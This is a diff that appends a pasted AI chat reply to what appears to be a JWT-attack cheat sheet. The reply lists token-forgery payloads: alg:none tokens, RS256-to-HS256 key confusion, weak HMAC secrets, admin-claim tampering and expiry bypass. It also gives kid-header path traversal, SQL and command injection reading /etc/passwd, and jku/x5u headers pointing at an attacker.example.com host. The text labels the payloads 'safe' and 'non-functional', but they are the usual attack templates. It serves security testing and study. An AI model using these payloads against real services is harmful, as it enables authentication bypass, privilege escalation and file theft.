@@ -542,3 +542,355 @@ You should create your own key pair for this attack and host it. It should look 
 - [Simple JWT hacking - Hari Prasanth (@b1ack_h00d) - March 7, 2019](https://medium.com/@blackhood/simple-jwt-hacking-73870a976750)
 - [WebSec CTF - Authorization Token - JWT Challenge - Kris Hunt - August 7, 2016](https://ctf.rip/websec-ctf-authorization-token-jwt-challenge/)
 - [Write up – JRR Token – LeHack 2019 - Laphaze - July 7, 2019](https://web.archive.org/web/20210512205928/https://rootinthemiddle.org/write-up-jrr-token-lehack-2019/)
+
+  Got it — you want the **entire JWT Complete Test Case (with Bypass Cases)** again **from the beginning**, in the **same format** used for the other vulnerabilities (Host Header, SSRF, etc.) — clean, readable, structured, and including **full bypass payload lists**.
+
+Here it is.
+
+---
+
+# ✅ **JWT Vulnerabilities – Complete Test Case (with Bypass Cases)**
+
+**Safe, educational payloads only (non-functional).**
+
+---
+
+# **1. What to Test (List of Vulnerabilities)**
+
+### **1.1 `alg: none` Acceptance**
+
+Server accepts unsigned JWT tokens.
+
+### **1.2 Algorithm Confusion (RS256 ↔ HS256)**
+
+Switching signature algorithm to bypass signature validation.
+
+### **1.3 Weak Secret / Default HMAC Key**
+
+Testing if token is signed using predictable secrets.
+
+### **1.4 Claim Manipulation (Privilege Escalation)**
+
+Editing `admin`, `role`, `sub`, `email`, `groups`, etc.
+
+### **1.5 Expiry Bypass (`exp`, `iat`, `nbf`)**
+
+Changing token lifetime or making it valid indefinitely.
+
+### **1.6 `kid` Header Injection**
+
+Directory traversal, SQL injection, or RCE attempts inside header.
+
+### **1.7 JWK / JKU / X5U Injection**
+
+Tricking the server to trust attacker-provided keys.
+
+### **1.8 Public Key as HMAC Secret (Key Confusion)**
+
+Misconfigured server uses RSA public key as HMAC secret.
+
+### **1.9 Replay & Token Reuse**
+
+Reusing valid JWTs without proper invalidation.
+
+### **1.10 Missing Audience / Issuer Validation**
+
+Accepting tokens from other applications.
+
+---
+
+# **2. Core Attack Payloads (Safe Examples)**
+
+These are **safe pseudo-payloads**, NOT real working attack tokens.
+
+---
+
+## **2.1 `alg: none` Test Token**
+
+```
+HEADER:
+{ "alg": "none", "typ": "JWT" }
+
+PAYLOAD:
+{ "user": "admin", "role": "superadmin" }
+
+JWT:
+<base64(header)>.<base64(payload)>.
+```
+
+---
+
+## **2.2 RS256 → HS256 Algorithm Confusion**
+
+```
+HEADER:
+{ "alg": "HS256", "typ": "JWT" }
+
+PAYLOAD:
+{ "user": "admin" }
+
+SIGNATURE:
+HMAC_SHA256(<RSA_PUBLIC_KEY>, <data>)
+```
+
+---
+
+## **2.3 Weak HMAC Secret Test**
+
+Try signing with:
+
+```
+secret
+password
+admin
+jwtsecret
+123456
+changeme
+```
+
+---
+
+## **2.4 Privilege Escalation via Claims**
+
+```
+{
+  "user": "admin",
+  "admin": true,
+  "role": "superadmin"
+}
+```
+
+```
+{
+  "sub": "victim@example.com",
+  "email_verified": true
+}
+```
+
+---
+
+## **2.5 Expiry Bypass**
+
+```
+{
+  "user": "admin",
+  "exp": 9999999999
+}
+```
+
+```
+{
+  "nbf": 0,
+  "iat": 0
+}
+```
+
+---
+
+# **3. Bypass Payloads (Complete List)**
+
+These demonstrate *bypass mechanisms* safely.
+
+---
+
+## **3.1 Bypass: `alg: none`**
+
+```
+HEADER:
+{ "alg": "none" }
+
+PAYLOAD:
+{ "user": "root" }
+```
+
+---
+
+## **3.2 Bypass: Algorithm Swap (HS256 ↔ RS256)**
+
+### Attack idea
+
+Misconfigured server:
+
+* Expects **RS256** (public/private key)
+* Accepts **HS256** (shared secret)
+  Attacker signs using **public key**.
+
+```
+HEADER:
+{ "alg": "HS256" }
+
+PAYLOAD:
+{ "user": "admin" }
+
+SIGNATURE:
+HMAC_SHA256(<RSA_PUBLIC_KEY>, <data>)
+```
+
+---
+
+## **3.3 Bypass: `kid` Path Traversal**
+
+```
+HEADER:
+{
+  "alg": "HS256",
+  "kid": "../../../../../../etc/passwd"
+}
+```
+
+---
+
+## **3.4 Bypass: `kid` SQL Injection**
+
+```
+HEADER:
+{
+  "alg": "HS256",
+  "kid": "' OR '1'='1"
+}
+```
+
+---
+
+## **3.5 Bypass: `kid` Command Injection (SAFE example)**
+
+```
+HEADER:
+{
+  "alg": "HS256",
+  "kid": "`cat /etc/passwd`"
+}
+```
+
+---
+
+## **3.6 Bypass: JWK Injection**
+
+```
+HEADER:
+{
+  "alg": "HS256",
+  "jwk": {
+    "kty": "oct",
+    "k": "QUJDREVGR0g="   // base64("ABCDEFGH")
+  }
+}
+```
+
+---
+
+## **3.7 Bypass: JKU Remote Key Loading**
+
+```
+HEADER:
+{
+  "alg": "RS256",
+  "jku": "https://attacker.example.com/evil-jwks.json"
+}
+```
+
+---
+
+## **3.8 Bypass: X5U Fake Certificate URL**
+
+```
+HEADER:
+{
+  "alg": "RS256",
+  "x5u": "https://attacker.example.com/fake.pem"
+}
+```
+
+---
+
+## **3.9 Bypass: Override Account Claims**
+
+```
+{
+  "sub": "victim@example.com"
+}
+```
+
+```
+{
+  "username": "admin"
+}
+```
+
+---
+
+# **4. Complete JWT Bypass Payload List (All in One Place)**
+
+### **4.1 `alg: none`**
+
+```
+{ "alg": "none" }
+```
+
+### **4.2 RS256 → HS256 swap**
+
+```
+{ "alg": "HS256" }
+```
+
+### **4.3 Weak Secrets**
+
+```
+secret
+password
+admin
+jwtsecret
+123456
+```
+
+### **4.4 Path traversal**
+
+```
+"kid": "../../../../etc/passwd"
+```
+
+### **4.5 SQL Injection**
+
+```
+"kid": "' OR '1'='1"
+```
+
+### **4.6 Command Execution (safe example)**
+
+```
+"kid": "`cat /etc/passwd`"
+```
+
+### **4.7 JWK injection**
+
+```
+"jwk": { "kty": "oct", "k": "QUJDREVGR0g=" }
+```
+
+### **4.8 JKU hosted key**
+
+```
+"jku": "https://attacker.example.com/fake-jwk.json"
+```
+
+### **4.9 X5U**
+
+```
+"x5u": "https://attacker.example.com/cert.pem"
+```
+
+### **4.10 Expiry bypass**
+
+```
+"exp": 9999999999
+```
+
+---
+
+# **5. Safe Testing Notes**
+
+* None of these tokens are valid or malicious.
+* They are strictly for **learning / awareness / secure development**.
+* They show **structure**, not exploitability.
+
+---
